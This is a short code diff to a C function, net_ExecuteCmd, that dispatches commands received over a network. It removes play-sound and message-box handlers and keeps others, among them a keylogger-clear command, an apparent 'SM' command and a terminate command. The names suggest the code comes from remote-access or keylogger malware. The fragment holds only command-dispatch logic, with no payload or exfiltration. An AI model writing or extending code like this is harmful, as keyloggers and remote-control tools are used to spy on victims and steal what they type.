@@ -54,12 +54,8 @@ int net_ExecuteCmd(char* msg, int msgLen)
 		}
 
 		return net_cmd_SM(msg, msgLen);
-	}else if(cmd == NET_CMD_PLAYSOUND){
-		return net_cmd_PlaySound(msg, msgLen);
 	}else if(cmd == NET_CMD_KEYLOGGER_CLEAR){
 		return net_cmd_kl_Clear(msg, msgLen);
-	}else if(cmd == NET_CMD_MESSAGEBOX){
-		return net_cmd_mbox(msg, msgLen);
 	}else if(cmd == NET_CMD_TERMINATE){
 		exit(0);
 	}
